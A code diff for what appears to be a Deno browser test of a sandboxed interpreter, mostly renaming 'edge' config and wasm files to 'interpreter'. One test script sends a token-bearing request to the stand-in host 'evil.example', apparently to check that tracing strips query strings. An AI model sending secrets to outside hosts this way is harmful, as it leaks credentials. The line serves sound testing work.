@@ -11,7 +11,7 @@ if (!BASE) throw new Error("set EDGE_CDN_BASE (make serve)");
 
 const REPO = new URL("../../", import.meta.url).pathname; // the repo root
 const cases = JSON.parse(readFileSync(new URL("./js.json", import.meta.url)));
-const PKG = JSON.parse(readFileSync(new URL("./app/edge.json", import.meta.url)));
+const PKG = JSON.parse(readFileSync(new URL("./app/interpreter.json", import.meta.url)));
 // Negative fixtures, only their own cases import them, abi2 and ui fail to load by design.
 const FIXTURES = new Set(["trap", "abi2", "ui"]);
 // use every module the app carries, packages are used by the cases that need them
@@ -82,7 +82,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
     await page.goto("http://localhost/js/tests/index.html");
 
     try {
-        // One worker runs every case, and the page reads app/edge.json and the app's files for it.
+        // One worker runs every case, and the page reads app/interpreter.json and the app's files for it.
         await page.evaluate(async (host) => {
             const { createWorker } = await import(host);
             globalThis.worker = await createWorker({ baseUrl: new URL("./app/", location.href).href });
@@ -202,7 +202,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
         // A cap the embedder declares reaches the engine, the sandbox default finishes this loop.
         const capped = await page.evaluate(async (host) => {
             const { createWorker } = await import(host);
-            const worker = await createWorker({ wasmUrl: "https://edge.test/edge.wasm", limits: { ops: 1000 } });
+            const worker = await createWorker({ wasmUrl: "https://edge.test/interpreter.wasm", limits: { ops: 1000 } });
             const { out } = await worker.run("var n = 0;\nfor (var i = 0; i < 100000; i = i + 1) n = n + 1;\nprint n;");
             worker.dispose();
             return out;
@@ -212,7 +212,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
         // a traced run reports what it reached and a url without its query
         const trace = await page.evaluate(async (host) => {
             const { createWorker } = await import(host);
-            const worker = await createWorker({ wasmUrl: "https://edge.test/edge.wasm", trace: true, permissions: { main: ["net"] } });
+            const worker = await createWorker({ wasmUrl: "https://edge.test/interpreter.wasm", trace: true, permissions: { main: ["net"] } });
             const events = [];
             worker.onTrace((event) => events.push(event));
             await worker.run("var net = import(\"net\");\nprint \"read it\";\nnet.request(\"GET\", \"https://evil.example/x?token=t-456\", nil, nil);\n");
